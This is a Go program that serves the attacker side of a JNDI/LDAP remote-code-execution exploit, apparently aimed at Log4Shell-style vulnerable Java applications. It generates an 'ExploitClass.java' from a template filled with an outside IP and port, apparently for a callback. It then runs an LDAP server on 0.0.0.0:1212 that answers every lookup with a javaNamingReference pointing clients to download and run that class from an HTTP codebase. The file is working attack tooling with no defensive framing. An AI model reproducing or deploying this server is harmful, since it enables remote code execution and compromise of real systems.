package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/signal"
	"syscall"
	"text/template"

	ldap "github.com/vjeantet/ldapserver"
)

func main() {

	makeClassFile()
	fmt.Println("Template is ready")
	ldapServer := startLdapServer()

	ch := make(chan os.Signal, 2)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	close(ch)
	ldapServer.Stop()
}

func makeClassFile() {
	vars := make(map[string]interface{})
	vars["IP"] = "13.127.68.26/1111"
	tmpl, _ := template.ParseFiles("exploit.tmpl")
	file, _ := os.Create("ExploitClass.java")
	defer file.Close()
	tmpl.Execute(file, vars)
}

func startLdapServer() *ldap.Server {
	ldap.Logger = log.New(ioutil.Discard, "", log.LstdFlags)
	server := ldap.NewServer()
	routes := ldap.NewRouteMux()
	routes.Search(handleSearch)
	routes.Bind(handleBind)
	server.Handle(routes)
	go func() {
		err := server.ListenAndServe("0.0.0.0:1212")
		if err != nil {
			panic(err)
		}
	}()
	return server
}

func handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetSearchRequest()
	select {
	case <-m.Done:
		log.Print("Leaving handleSearch...")
		return
	default:
	}
	//codebase := "http://localhost:5050/ExploitClass.java"
	e := ldap.NewSearchResultEntry(string(r.BaseObject()))
	e.AddAttribute("javaClassName", "foo")
	e.AddAttribute("javaCodeBase", "http://localhost:8080/")
	e.AddAttribute("objectClass", "javaNamingReference")
	e.AddAttribute("javaFactory", "ExploitClass")
	w.Write(e)
	res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}

func handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}
